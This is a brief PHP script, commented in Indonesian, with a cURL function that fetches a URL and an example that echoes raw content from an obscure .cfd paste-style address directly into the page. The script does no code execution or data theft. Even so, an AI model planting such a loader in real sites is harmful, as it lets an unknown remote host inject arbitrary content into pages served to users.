<?php
function getExternalContentCurl($url) {
    // Validasi URL
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return "URL tidak valid";
    }
    
    // Inisialisasi cURL
    $ch = curl_init();
    
    // Set opsi cURL
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    
    // Eksekusi
    $content = curl_exec($ch);
    
    // Cek error
    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        curl_close($ch);
        return "cURL Error: " . $error_msg;
    }
    
    // Get HTTP status code
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code != 200) {
        return "HTTP Error: Status code " . $http_code;
    }
    
    return $content;
}

// Contoh penggunaan
 $url = "https://p.phyo186.cfd/kovo3-9HsSO/raw";
 $content = getExternalContentCurl($url);

if (is_string($content) && !str_contains($content, "Error")) {
    // Hanya menampilkan konten tanpa heading
    echo $content;
} else {
    echo $content;
}
?>
